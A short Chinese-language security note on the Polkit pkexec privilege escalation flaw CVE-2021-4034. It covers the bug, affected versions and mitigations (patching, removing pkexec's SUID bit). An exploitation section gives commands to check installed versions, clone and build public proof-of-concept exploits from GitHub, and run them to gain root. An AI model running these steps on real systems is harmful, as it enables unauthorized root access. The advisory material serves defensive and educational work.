## **Polkit提权(CVE-2021-4034)**

pkexec是Polkit框架的一部分，它允许授权的非特权用户执行需要特权的命令。这个漏洞是由于pkexec在处理命令行参数时存在缺陷，攻击者可以通过操纵环境变量来诱导pkexec执行任意代码，从而获得root权限。


影响版本：
2009年5月至今发布的所有 Polkit 版本 注：Polkit（policykit）预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。


修复建议：
* **官方升级**: 官方已经发布了补丁来修复这个漏洞，建议用户及时安装补丁进行防护。
* **临时防护措施**: 如果补丁还未发布或暂时无法安装，可以通过移除pkexec的SUID位来进行临时防护，例如使用命令`chmod 0755 /usr/bin/pkexec`。


## **利用**
ubantu判断：dpkg -l policykit-1  （显示有版本启用，则大概率存在漏洞）
centos判断：rpm -qa polkit
利用：
```
git clone https://github.com/berdav/CVE-2021-4034.git
cd CVE-2021-4034/
make
./cve-2021-4034
```
^
利用：
exp源文件经过gcc编译，如没有gcc自行下载，此测试文件来自：https://github.com/arthepsy/CVE-2021-4034
输入：gcc cve-2021-4034-poc.c -o exp 
得到exp文件：./exp 即可执行
验证id，得到当前权限为root
